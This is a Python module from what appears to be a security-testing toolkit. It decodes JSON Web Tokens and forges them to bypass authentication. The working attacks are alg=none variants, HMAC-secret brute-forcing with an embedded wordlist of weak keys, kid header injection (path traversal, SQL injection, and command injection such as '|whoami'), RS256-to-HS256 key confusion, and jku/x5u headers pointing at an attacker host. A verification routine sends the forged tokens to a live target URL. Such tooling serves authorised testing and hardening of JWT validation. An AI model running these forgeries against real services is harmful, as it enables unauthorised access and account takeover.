"""
JWT (JSON Web Token) analysis and attack.

JWTs are three base64url-encoded segments separated by dots:

    header.payload.signature

Each segment decodes to JSON (except the signature, which is raw
bytes). Common attacks:

  1. alg=none
     Change header alg to "none" and strip the signature. Some
     libraries accept unsigned tokens.

  2. Weak HMAC key
     Brute-force the HMAC secret against a wordlist. Common
     secrets: "secret", "your-256-bit-secret", "changeme",
     the app name, etc.

  3. Algorithm confusion (RS256 → HS256)
     If the server uses RS256 (asymmetric), an attacker who knows
     the public key can switch alg to HS256 and sign with the
     public key as the HMAC secret.

  4. kid injection
     The `kid` header lets the server pick which key to use. If
     the app reflects kid into a file path or SQL query, it can
     be exploited:
       kid="../../../../dev/null"  → empty HMAC key
       kid="|whoami"                → command injection
       kid="key' UNION SELECT ..."  → SQL injection

  5. jku / x5u / x5c abuse
     If the server loads keys from a URL in the header, an attacker
     can point it at their own server.

This module:

  - Decodes a token (--decode).
  - Runs each attack (--attack [alg-none|weak-key|kid|confusion|all]).
  - By default, runs all applicable attacks.
  - Uses an embedded wordlist for the weak-key attack (~200 entries).
  - Verifies forged tokens against a target if --verify is given.

Usage:

    from vuln.jwt import decode, attack

    info = decode(token)
    results = attack(token)

    # CLI
    python -m vuln.jwt TOKEN --decode
    python -m vuln.jwt TOKEN --attack weak-key
    python -m vuln.jwt TOKEN --verify https://example.com/me

Findings written to the store:
    one row per successful attack
"""

import asyncio
import base64
import hashlib
import hmac
import json
import re
import secrets
from datetime import datetime, timezone
from pathlib import Path

from core.http import new_session, fetch, RateLimiter
from core.output import info, success, warn, error


# ---------------------------------------------------------------------
# Embedded wordlist for weak-key brute-force
# ---------------------------------------------------------------------

DEFAULT_KEYS = [
    # --- Generic low-effort secrets ---
    "secret", "SECRET", "Secret", "secret1", "secret123",
    "secretkey", "secret_key", "secret-key",
    "password", "PASSWORD", "Password", "password1", "password123",
    "passwd", "pass",
    "changeme", "CHANGEME", "Changeme", "changeme1", "changeme123",
    "test", "TEST", "test123", "testing", "testkey", "test_key",
    "demo", "example", "sample",
    "default", "DEFAULT", "default_secret", "default-key",

    # --- JWT-specific ---
    "jwt", "JWT", "jwt_secret", "jwt-secret", "jwt_secret_key",
    "jwtsecret", "jwtsecretkey", "jwt-token", "jwt_token",
    "mysecret", "my_secret", "my-jwt-secret", "my_jwt_secret",
    "your-256-bit-secret", "your-secret-key", "your_secret_key",
    "your-384-bit-secret", "your-512-bit-secret",
    "your-256-bit-key", "your-secret", "yoursecret",

    # --- Common words ---
    "key", "KEY", "Key", "apikey", "api_key", "api-key",
    "private", "PRIVATE", "private_key", "privatekey",
    "signing-key", "signing_key", "signingkey", "signing_key_1",
    "hmac", "HMAC", "hmac-key", "hmac_secret", "hmac_secret_key",
    "admin", "ADMIN", "Admin", "administrator", "admin123",
    "root", "ROOT", "toor",
    "letmein", "letmein1", "welcome", "welcome1",
    "supersecret", "super-secret", "super_secret", "super_secret_key",
    "topsecret", "top-secret", "top_secret",
    "qwerty", "qwerty123", "123456", "12345678", "12345",
    "abc123", "abc123456", "1234567890",
    "0123456789", "9876543210",
    "asdf", "asdfasdf", "asdf1234",
    "iloveyou", "monkey", "dragon", "master",
    "hunter2", "hunter", "Hunter2",

    # --- Framework defaults ---
    "django-insecure", "django_secret_key", "django_secret",
    "flask_secret_key", "flask-secret-key", "flask-secret",
    "secret_key_base", "secret-key-base", "secretkeybase",
    "rails_secret", "rails-secret", "rails-secret-key-base",
    "spring", "springboot", "spring-security", "spring_secret",
    "laravel", "laravel_secret", "laravel-secret",
    "node", "nodejs", "node_secret", "node-secret",
    "express", "express_secret", "express-secret",
    "sails", "sails_secret", "sails-secret",
    "phoenix", "phoenix_secret", "phoenix-secret",
    "nextjs", "next-auth", "nextauth", "nextauth-secret",
    "nuxt", "nuxt_secret",
    "fastapi", "fastapi_secret", "fastapi-secret",

    # --- Auth provider defaults ---
    "auth0", "auth0-secret", "auth0-secret-key",
    "okta", "okta-secret", "okta-token-key",
    "keycloak", "keycloak-secret",
    "cognito", "cognito-secret",
    "firebase", "firebase-secret",
    "supabase", "supabase-secret", "supabase-jwt-secret",

    # --- Environment names ---
    "development", "dev", "dev-secret", "dev_secret", "dev-secret-key",
    "staging", "staging-secret", "staging_secret",
    "production", "prod", "prod-secret", "production-secret",

    # --- Corporate / SaaS defaults ---
    "company", "acme", "example", "demo-secret",
    "tenant", "user", "customer", "client",
    "staff", "employee", "internal",

    # --- Test/demo tokens from docs ---
    "hello", "Hello", "HELLO", "world", "World", "WORLD",
    "foobar", "foo", "bar", "baz", "qux", "quux",

    # --- Long passphrases ---
    "correct-horse-battery-staple",
    "correcthorsebatterystaple",
    "the quick brown fox",
    "thequickbrownfox",
    "space_monkey", "spacemonkey",
    "hunter2hunter2",
    "12345678901234567890123456789012",  # 32-byte minimum for HS256

    # --- Common injection / test payloads ---
    "null", "None", "none", "undefined", "nil",
    "change-me", "change_me", "changeme_now",
    "P@ssw0rd", "P@ssword", "p@ssw0rd",
    "Password!", "Password1!",
    "Adm1n", "adm1n", "Adm1n123",
    "secr3t", "s3cr3t", "s3cr3t-key",
    "my$ecret", "my_s3cret",
]


# kid path-traversal payloads that, if reflected into a file read,
# would load files with predictable HMAC content
KID_FILE_TRAVERSALS = [
    ("/dev/null",           b"",         "empty file → HMAC key is empty bytes"),
    ("../../../../dev/null", b"",        "path traversal → empty HMAC key"),
    ("/etc/hostname",       None,        "any linux host has this file"),
]


# ---------------------------------------------------------------------
# Base64url helpers
# ---------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


# ---------------------------------------------------------------------
# Human-friendly time formatting
# ---------------------------------------------------------------------

def _human_time(unix_ts) -> str:
    """Turn a Unix timestamp into 'YYYY-MM-DD HH:MM UTC (expired/in Xd)'."""
    try:
        ts = int(unix_ts)
    except (TypeError, ValueError):
        return str(unix_ts)
    try:
        dt = datetime.fromtimestamp(ts, tz=timezone.utc)
    except Exception:
        return str(unix_ts)
    now = datetime.now(timezone.utc)
    delta = dt - now
    delta_secs = int(delta.total_seconds())
    if delta_secs < 0:
        rel = f"expired {abs(delta_secs) // 86400}d ago" if \
              abs(delta_secs) > 86400 else \
              f"expired {abs(delta_secs) // 3600}h ago" if \
              abs(delta_secs) > 3600 else \
              f"expired {abs(delta_secs)}s ago"
    else:
        rel = f"expires in {delta_secs // 86400}d" if \
              delta_secs > 86400 else \
              f"expires in {delta_secs // 3600}h" if \
              delta_secs > 3600 else \
              f"expires in {delta_secs}s"
    return f"{dt.strftime('%Y-%m-%d %H:%M UTC')} ({rel})"


# ---------------------------------------------------------------------
# Token decoding
# ---------------------------------------------------------------------

def decode(token: str) -> dict:
    """Decode a JWT without verifying the signature."""
    out = {
        "valid_structure": False,
        "header": {},
        "payload": {},
        "signature_b64": "",
        "signature_bytes": 0,
        "alg": None,
        "kid": None,
        "typ": None,
        "jku": None,
        "x5u": None,
        "x5c": None,
        "error": None,
    }
    if not token or token.count(".") < 2:
        out["error"] = "not a JWT (expects 3 segments separated by '.')"
        return out

    parts = token.split(".")
    h_b64, p_b64 = parts[0], parts[1]
    s_b64 = parts[2] if len(parts) > 2 else ""

    try:
        out["header"] = json.loads(_b64url_decode(h_b64))
    except Exception as e:
        out["error"] = f"invalid header: {type(e).__name__}: {e}"
        return out

    try:
        out["payload"] = json.loads(_b64url_decode(p_b64))
    except Exception as e:
        out["error"] = f"invalid payload: {type(e).__name__}: {e}"
        return out

    out["signature_b64"] = s_b64
    try:
        out["signature_bytes"] = len(_b64url_decode(s_b64))
    except Exception:
        pass

    h = out["header"]
    out["alg"] = h.get("alg")
    out["kid"] = h.get("kid")
    out["typ"] = h.get("typ")
    out["jku"] = h.get("jku")
    out["x5u"] = h.get("x5u")
    out["x5c"] = h.get("x5c")
    out["valid_structure"] = True
    return out


# ---------------------------------------------------------------------
# Attack 1: alg=none
# ---------------------------------------------------------------------

def attack_alg_none(token: str) -> list[dict]:
    """Forge the token with alg=none."""
    decoded = decode(token)
    if not decoded["valid_structure"]:
        return []
    findings = []
    for alg_value in ("none", "None", "NONE", "nOnE", "nOne"):
        header = dict(decoded["header"])
        header["alg"] = alg_value
        header_b64 = _b64url_encode(
            json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(
            json.dumps(decoded["payload"],
                       separators=(",", ":")).encode())
        for variant_name, forged in [
            ("trailing_dot", f"{header_b64}.{payload_b64}."),
            ("no_dot",       f"{header_b64}.{payload_b64}"),
            ("dummy_sig",    f"{header_b64}.{payload_b64}.AAAA"),
        ]:
            findings.append({
                "attack": "alg_none",
                "forged_token": forged,
                "variant": f"{alg_value}/{variant_name}",
                "notes": f"alg={alg_value}, signature stripped "
                          f"({variant_name})",
            })
    return findings


# ---------------------------------------------------------------------
# Attack 2: weak HMAC key
# ---------------------------------------------------------------------

def attack_weak_key(token: str, wordlist: list[str] | None = None,
                     extra_keys: list[str] | None = None,
                     verbose: bool = False) -> list[dict]:
    """Brute-force the HMAC secret against a wordlist."""
    decoded = decode(token)
    if not decoded["valid_structure"]:
        return []
    alg = (decoded["alg"] or "").upper()
    if not alg.startswith("HS"):
        return []

    words = list(wordlist if wordlist is not None else DEFAULT_KEYS)
    if extra_keys:
        # Put extra_keys (target-derived) first — higher hit rate
        words = list(extra_keys) + [w for w in words if w not in extra_keys]

    parts = token.split(".")
    if len(parts) < 3:
        return []
    h_b64, p_b64, s_b64 = parts[0], parts[1], parts[2]
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    try:
        expected_sig = _b64url_decode(s_b64)
    except Exception:
        return []

    algo = {"HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512}.get(alg)
    if algo is None:
        return []

    for key in words:
        try:
            mac = hmac.new(key.encode("utf-8"), signing_input, algo).digest()
        except Exception:
            continue
        if hmac.compare_digest(mac, expected_sig):
            return [{
                "attack": "weak_key",
                "key": key,
                "alg": alg,
                "notes": f"HMAC secret found: {key!r}",
            }]
    return []


def derive_target_keys(target_url: str | None) -> list[str]:
    """Derive plausible keys from a target URL (org-specific guessing)."""
    if not target_url:
        return []
    from urllib.parse import urlparse
    try:
        host = urlparse(target_url).hostname or ""
    except Exception:
        return []
    if not host:
        return []
    # Strip www.
    if host.startswith("www."):
        host = host[4:]
    parts = host.split(".")
    base = parts[0] if parts else host
    apex = ".".join(parts[-2:]) if len(parts) >= 2 else host

    candidates = set()
    for stem in (base, apex, base.replace("-", ""),
                 apex.replace(".", ""), apex.replace(".", "-")):
        if not stem:
            continue
        candidates.add(stem)
        candidates.add(f"{stem}-secret")
        candidates.add(f"{stem}_secret")
        candidates.add(f"{stem}-key")
        candidates.add(f"{stem}_key")
        candidates.add(f"{stem}-jwt")
        candidates.add(f"{stem}_jwt")
        candidates.add(f"{stem}-jwt-secret")
        candidates.add(f"{stem}_jwt_secret")
        candidates.add(f"{stem}secret")
        candidates.add(f"{stem}key")
    return sorted(candidates)


# ---------------------------------------------------------------------
# Attack 3: kid injection
# ---------------------------------------------------------------------

def attack_kid(token: str) -> list[dict]:
    """Generate kid injection variants (payload generation only)."""
    decoded = decode(token)
    if not decoded["valid_structure"]:
        return []

    findings = []

    # --- File traversal + empty key signing ---
    for kid_value, hmac_key, note in KID_FILE_TRAVERSALS:
        header = dict(decoded["header"])
        header["kid"] = kid_value
        header_b64 = _b64url_encode(
            json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(
            json.dumps(decoded["payload"],
                       separators=(",", ":")).encode())
        signing_input = f"{header_b64}.{payload_b64}".encode("ascii")

        # Sign with the file's expected contents (empty for /dev/null)
        for alg_name, algo in (
                ("HS256", hashlib.sha256),
                ("HS384", hashlib.sha384),
                ("HS512", hashlib.sha512)):
            header_v = dict(header)
            header_v["alg"] = alg_name
            header_b64_v = _b64url_encode(
                json.dumps(header_v, separators=(",", ":")).encode())
            signing_input_v = f"{header_b64_v}.{payload_b64}".encode("ascii")
            mac = hmac.new(hmac_key, signing_input_v, algo).digest()
            forged = f"{header_b64_v}.{payload_b64}.{_b64url_encode(mac)}"
            findings.append({
                "attack": "kid",
                "attack_type": "file_traversal",
                "kid_value": kid_value,
                "forged_token": forged,
                "notes": f"kid={kid_value!r} signed with {alg_name}, "
                          f"{note}",
            })
        # Also emit an unsigned variant
        findings.append({
            "attack": "kid",
            "attack_type": "file_traversal_unsigned",
            "kid_value": kid_value,
            "forged_token": f"{header_b64}.{payload_b64}.",
            "notes": f"kid={kid_value!r} (unsigned)",
        })

    # --- SQL injection in kid ---
    sql_payloads = [
        "' UNION SELECT 'known-key' -- ",
        "key' UNION SELECT 'known-key' -- ",
        "x' OR '1'='1",
        "1 UNION SELECT 'known-key'",
    ]
    for kid_value in sql_payloads:
        header = dict(decoded["header"])
        header["kid"] = kid_value
        header_b64 = _b64url_encode(
            json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(
            json.dumps(decoded["payload"],
                       separators=(",", ":")).encode())
        findings.append({
            "attack": "kid",
            "attack_type": "sql_injection",
            "kid_value": kid_value,
            "forged_token": f"{header_b64}.{payload_b64}.",
            "notes": f"kid={kid_value!r} — SQL injection hint",
        })

    # --- Command injection in kid ---
    for kid_value in ("|whoami", "; whoami", "$(whoami)", "`whoami`"):
        header = dict(decoded["header"])
        header["kid"] = kid_value
        header_b64 = _b64url_encode(
            json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(
            json.dumps(decoded["payload"],
                       separators=(",", ":")).encode())
        findings.append({
            "attack": "kid",
            "attack_type": "command_injection",
            "kid_value": kid_value,
            "forged_token": f"{header_b64}.{payload_b64}.",
            "notes": f"kid={kid_value!r} — command injection hint",
        })

    return findings


# ---------------------------------------------------------------------
# Attack 4: algorithm confusion (RS256 -> HS256)
# ---------------------------------------------------------------------

def attack_alg_confusion(token: str,
                          public_key_pem: bytes | str | None = None
                          ) -> list[dict]:
    """Forge HS256-signed tokens using the RS256 public key."""
    decoded = decode(token)
    if not decoded["valid_structure"]:
        return []
    alg = (decoded["alg"] or "").upper()
    if not alg.startswith(("RS", "ES", "PS")):
        return []

    findings = []
    header = dict(decoded["header"])
    header["alg"] = "HS256"
    header_b64 = _b64url_encode(
        json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(
        json.dumps(decoded["payload"],
                   separators=(",", ":")).encode())

    if public_key_pem is None:
        findings.append({
            "attack": "alg_confusion",
            "forged_token": f"{header_b64}.{payload_b64}.<sign here>",
            "notes": ("alg changed RS256→HS256. Sign the header.payload "
                       "string with HMAC-SHA256 using the RSA public key "
                       "(PEM bytes) as the HMAC secret."),
            "requires": "public_key_pem",
        })
        return findings

    if isinstance(public_key_pem, str):
        public_key_pem = public_key_pem.encode("utf-8")

    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    mac = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
    sig_b64 = _b64url_encode(mac)
    findings.append({
        "attack": "alg_confusion",
        "forged_token": f"{header_b64}.{payload_b64}.{sig_b64}",
        "notes": "RS256→HS256 forged using public key as HMAC secret",
    })
    return findings


# ---------------------------------------------------------------------
# Attack 5: jku / x5u header abuse
# ---------------------------------------------------------------------

def attack_jku(token: str, callback_url: str | None = None) -> list[dict]:
    """Generate jku / x5u header variants pointing at an attacker URL."""
    decoded = decode(token)
    if not decoded["valid_structure"]:
        return []

    findings = []
    attacker = callback_url or "https://attacker.test/jwks.json"
    for header_name in ("jku", "x5u"):
        header = dict(decoded["header"])
        header[header_name] = attacker
        header_b64 = _b64url_encode(
            json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(
            json.dumps(decoded["payload"],
                       separators=(",", ":")).encode())
        findings.append({
            "attack": "jku_x5u",
            "attack_type": header_name,
            "forged_token": f"{header_b64}.{payload_b64}.",
            "notes": f"{header_name}={attacker!r} (unsigned — server "
                      f"may fetch attacker's keys if it doesn't validate)",
        })
    return findings


# ---------------------------------------------------------------------
# Offline attack orchestrator
# ---------------------------------------------------------------------

def attack(token: str, wordlist: list[str] | None = None,
            public_key_pem: bytes | str | None = None,
            target_url: str | None = None,
            verbose: bool = False) -> dict:
    """Run all applicable offline attacks on a token."""
    decoded = decode(token)
    result = {
        "decoded": decoded,
        "findings": [],
    }
    if not decoded["valid_structure"]:
        return result

    alg = (decoded["alg"] or "").upper()

    # 1. Weak key (HMAC only)
    if alg.startswith("HS"):
        extra = derive_target_keys(target_url)
        wk = attack_weak_key(token, wordlist=wordlist,
                              extra_keys=extra, verbose=verbose)
        result["findings"].extend(wk)

    # 2. alg=none (always)
    result["findings"].extend(attack_alg_none(token))

    # 3. kid injection (always)
    result["findings"].extend(attack_kid(token))

    # 4. Algorithm confusion (RS/ES/PS only)
    if alg.startswith(("RS", "ES", "PS")):
        result["findings"].extend(
            attack_alg_confusion(token, public_key_pem))

    # 5. jku/x5u abuse (always — payload generation only)
    result["findings"].extend(attack_jku(token))

    return result


# ---------------------------------------------------------------------
# Verification against a target
# ---------------------------------------------------------------------

async def verify_forgery(target_url: str, forged_token: str,
                          session=None, limiter=None,
                          header_name: str = "Authorization",
                          header_prefix: str = "Bearer ",
                          cookie_name: str | None = None,
                          verbose: bool = False) -> dict:
    """Send a forged token to a target and see if it's accepted."""
    own_session = session is None
    if own_session:
        session = new_session()
    if limiter is None:
        limiter = RateLimiter(rate=5.0)

    try:
        headers = {}
        cookies = None
        if cookie_name:
            cookies = {cookie_name: forged_token}
        else:
            headers[header_name] = f"{header_prefix}{forged_token}"

        # Baseline without token
        try:
            r_anon = await fetch(session, target_url, limiter,
                                  timeout=10.0)
        except Exception:
            r_anon = None

        # Forged request
        try:
            r_forged = await fetch(session, target_url, limiter,
                                    headers=headers, cookies=cookies,
                                    timeout=10.0)
        except Exception as e:
            return {"accepted": False,
                    "reason": f"transport: {type(e).__name__}: {e}"}

        if r_forged is None:
            return {"accepted": False, "reason": "no response"}

        status_anon = r_anon[0] if r_anon else None
        status_forged = r_forged[0]
        body_forged = (r_forged[2] or "")[:300]

        # --- Heuristics ---
        reason = ""
        accepted = False
        if status_forged == 200 and status_anon in (401, 403):
            accepted = True
            reason = (f"HTTP {status_forged} with token vs "
                       f"{status_anon} without")
        elif status_forged == 200 and status_anon is None:
            accepted = True
            reason = f"HTTP {status_forged} (anon request failed)"
        elif status_forged in (200, 201, 202, 204) and status_anon == 401:
            accepted = True
            reason = f"HTTP {status_forged} (anon 401)"
        elif status_forged in (401, 403):
            accepted = False
            reason = f"rejected (HTTP {status_forged})"

        # Sanity: did the body change meaningfully?
        if r_anon and accepted:
            if (r_anon[2] or "")[:300] == body_forged:
                accepted = False
                reason += " — BUT body identical to anon response"

        return {
            "accepted": accepted,
            "reason": reason,
            "status_anon": status_anon,
            "status_forged": status_forged,
            "body_snippet": body_forged,
        }
    finally:
        if own_session:
            await session.close()


# ---------------------------------------------------------------------
# Pretty-printing helpers
# ---------------------------------------------------------------------

def format_token_summary(decoded: dict) -> list[str]:
    """Return a list of human-readable lines describing the token."""
    lines = []
    h = decoded.get("header") or {}
    p = decoded.get("payload") or {}

    alg = h.get("alg") or "?"
    typ = h.get("typ") or "?"
    lines.append(f"alg={alg}  typ={typ}")
    if h.get("kid"):
        lines.append(f"kid={h['kid']}")
    if h.get("jku"):
        lines.append(f"jku={h['jku']}")
    if h.get("x5u"):
        lines.append(f"x5u={h['x5u']}")

    # Common claim names, human-formatted
    if p.get("sub"):
        lines.append(f"sub={p['sub']!r}")
    if p.get("name"):
        lines.append(f"name={p['name']!r}")
    if p.get("email"):
        lines.append(f"email={p['email']!r}")
    if p.get("role"):
        lines.append(f"role={p['role']!r}")
    if p.get("iss"):
        lines.append(f"iss={p['iss']!r}")
    if p.get("aud"):
        lines.append(f"aud={p['aud']!r}")
    if p.get("iat"):
        lines.append(f"iat={_human_time(p['iat'])}")
    if p.get("nbf"):
        lines.append(f"nbf={_human_time(p['nbf'])}")
    if p.get("exp"):
        lines.append(f"exp={_human_time(p['exp'])}")
    return lines


# ---------------------------------------------------------------------
# CLI entry
# ---------------------------------------------------------------------

async def run(token: str, store=None, verbose: bool = False,
               decode_only: bool = False,
               attacks: list[str] | None = None,
               wordlist_path: str | None = None,
               public_key_path: str | None = None,
               verify_url: str | None = None,
               cookie_name: str | None = None) -> dict:
    """CLI entry."""
    wordlist = None
    if wordlist_path:
        p = Path(wordlist_path)
        if p.exists():
            wordlist = [line.strip() for line in
                        p.read_text(encoding="utf-8",
                                     errors="ignore").splitlines()
                        if line.strip()]
            info(f"jwt: loaded {len(wordlist)} key(s) from "
                 f"{wordlist_path}")
        else:
            warn(f"jwt: wordlist not found: {wordlist_path}")

    public_key_pem = None
    if public_key_path:
        p = Path(public_key_path)
        if p.exists():
            public_key_pem = p.read_bytes()

    decoded = decode(token)

    print()
    if not decoded["valid_structure"]:
        error(f"jwt: {decoded['error']}")
        return {"decoded": decoded, "findings": []}

    # --- Show the decoded token ---
    success("JWT structure valid")
    for line in format_token_summary(decoded):
        print(f"  {line}")
    print(f"  signature: {decoded['signature_bytes']} byte(s)")

    print()
    print("  Header:")
    for k, v in decoded["header"].items():
        print(f"    {k}: {v!r}")
    print()
    print("  Payload:")
    for k, v in decoded["payload"].items():
        v_str = repr(v)
        if len(v_str) > 60:
            v_str = v_str[:57] + "..."
        # Human-friendly time for time claims
        if k in ("iat", "nbf", "exp") and isinstance(v, (int, float)):
            print(f"    {k}: {_human_time(v)}")
        else:
            print(f"    {k}: {v_str}")

    if decode_only:
        return {"decoded": decoded, "findings": []}

    # --- Run attacks ---
    print()
    info("jwt: running attacks")
    result = attack(token, wordlist=wordlist,
                     public_key_pem=public_key_pem,
                     target_url=verify_url,
                     verbose=verbose)

    findings = result["findings"]
    if not findings:
        warn("jwt: no offline attacks succeeded")
        return result

    by_attack: dict[str, list] = {}
    for f in findings:
        by_attack.setdefault(f["attack"], []).append(f)

    print()
    for atk, items in by_attack.items():
        if atk == "weak_key":
            success(f"  weak_key: KEY FOUND → {items[0]['key']!r}")
        elif atk == "alg_none":
            info(f"  alg_none: {len(items)} forge variant(s)")
            for i in items[:3]:
                print(f"    {i['variant']}")
        elif atk == "kid":
            info(f"  kid: {len(items)} variant(s)")
            for i in items[:3]:
                print(f"    [{i['attack_type']}] {i.get('kid_value')}")
        elif atk == "alg_confusion":
            info(f"  alg_confusion: {len(items)} variant(s)")
        elif atk == "jku_x5u":
            info(f"  jku/x5u: {len(items)} variant(s)")

    # --- Optionally verify against a target ---
    if verify_url and findings:
        print()
        info(f"jwt: verifying against {verify_url}")

        # Priority: weak_key (real), alg_none (2nd), kid (3rd)
        priority = ["weak_key", "alg_none", "kid", "alg_confusion"]
        to_try = []
        for atk in priority:
            for f in by_attack.get(atk, []):
                ft = f.get("forged_token")
                if ft and "<sign here>" not in ft:
                    to_try.append(f)

        if not to_try:
            warn("  no forgeable tokens to verify")
        else:
            verified_count = 0
            for f in to_try[:5]:  # try up to 5
                r = await verify_forgery(
                    verify_url, f["forged_token"],
                    cookie_name=cookie_name)
                status = r.get("status_forged")
                anon = r.get("status_anon")
                if r.get("accepted"):
                    verified_count += 1
                    success(f"  ✓ ACCEPTED ({f['attack']}/{f.get('variant', f.get('attack_type', ''))}) — "
                            f"HTTP {status} (anon: {anon})")
                    f["verified_accepted"] = True
                else:
                    info(f"  ✗ rejected ({f['attack']}) — {r.get('reason')}")

            if verified_count == 0:
                info(f"  all {len(to_try)} forged token(s) rejected — "
                     f"the library is validating signatures correctly")

    if store is not None and findings:
        stored = 0
        for f in findings:
            # Store weak_key always; other attacks only if verified
            if f["attack"] == "weak_key" or f.get("verified_accepted"):
                store.add_finding({
                    "module": "jwt",
                    "type": "jwt_weakness",
                    "severity": "high" if f["attack"] == "weak_key"
                                else "medium",
                    "target": verify_url or "offline",
                    "evidence": f.get("notes", f["attack"]),
                    "data": {
                        "attack": f["attack"],
                        "key": f.get("key"),
                        "forged_token": f.get("forged_token", "")[:200],
                        "verified": f.get("verified_accepted", False),
                    },
                })
                stored += 1
        success(f"wrote {stored} finding(s) to store")

    return result


# ---------------------------------------------------------------------
# CLI when run directly
# ---------------------------------------------------------------------

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="vuln.jwt",
        description="JWT decoder and attack toolkit.",
    )
    p.add_argument("token", help="the JWT string")
    p.add_argument("--decode", action="store_true",
                   help="only decode, don't attack")
    p.add_argument("--attack", action="append",
                   choices=["alg-none", "weak-key", "kid",
                            "confusion", "jku", "all"],
                   help="only run specific attack(s)")
    p.add_argument("--wordlist", default=None,
                   help="custom wordlist for weak-key attack")
    p.add_argument("--public-key", default=None,
                   help="RSA public key PEM for confusion attack")
    p.add_argument("--verify", default=None,
                   help="URL to verify forged tokens against")
    p.add_argument("--cookie-name", default=None,
                   help="cookie name if the token is sent as a cookie "
                        "instead of an Authorization header")
    p.add_argument("--store", action="store_true",
                   help="write findings to active workspace")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    store = None
    if args.store:
        from core.workspace import get_active, get_workspace
        from core.store import open_store
        active = get_active()
        if not active:
            warn("no active workspace; use `toolkit workspace switch`")
        else:
            ws = get_workspace(active)
            store = open_store(ws.db_path, workspace_name=active)

    asyncio.run(run(
        args.token, store=store, verbose=args.verbose,
        decode_only=args.decode,
        attacks=args.attack,
        wordlist_path=args.wordlist,
        public_key_path=args.public_key,
        verify_url=args.verify,
        cookie_name=args.cookie_name))


if __name__ == "__main__":
    _cli()